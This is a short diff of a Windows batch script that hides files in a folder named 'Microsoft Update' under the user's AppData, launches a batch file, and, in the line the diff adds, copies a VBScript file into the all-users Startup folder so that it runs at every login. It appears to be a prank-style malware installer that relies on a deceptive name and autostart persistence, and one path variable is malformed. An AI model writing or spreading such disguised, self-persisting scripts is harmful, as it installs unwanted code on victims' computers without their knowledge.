@@ -19,8 +19,7 @@ cd C:/Users/%username/AppData/Local
 mkdir "Microsoft Update"
 copy funnyahhaudio.wav "C:/Users/%username%/AppData/Local/Microsoft Update"
 copy audio.bat "C:/Users/%username%/AppData/Local/Microsoft Update"
-
-
+copy hehe.vbs "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
 copy thumboi.png C:/Users/%username%/Downloads
 copy thumb.bat C:/Users/%username%/Downloads
 start thumb.bat
